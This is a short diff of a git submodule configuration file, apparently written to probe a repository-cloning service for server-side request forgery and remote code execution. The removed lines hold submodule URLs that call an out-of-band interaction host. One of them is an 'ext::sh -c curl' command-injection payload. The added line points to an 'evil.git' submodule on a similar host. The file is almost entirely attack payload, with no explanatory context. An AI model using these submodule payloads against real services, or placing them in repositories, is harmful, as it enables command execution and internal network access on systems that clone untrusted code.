@@ -1,9 +1,3 @@
-[submodule "a"]
-	path = suba
-	url = https://9cmurd1tt558h7vmmb8a3guuglmch022k4tt.oastify.com/submodule-ssrf.git
-[submodule "b"]
-	path = subb
-	url = ext::sh -c "curl% https://9cmurd1tt558h7vmmb8a3guuglmch022k4tt.oastify.com/submodule-rce"
-[submodule "c"]
-	path = subc
-	url = git://9cmurd1tt558h7vmmb8a3guuglmch022k4tt.oastify.com/x
+[submodule "x"]
+	path = x
+	url = https://sub.6horwa6qy2a5m40jr8d78dzrlir9sx77s9ay.oastify.com/evil.git
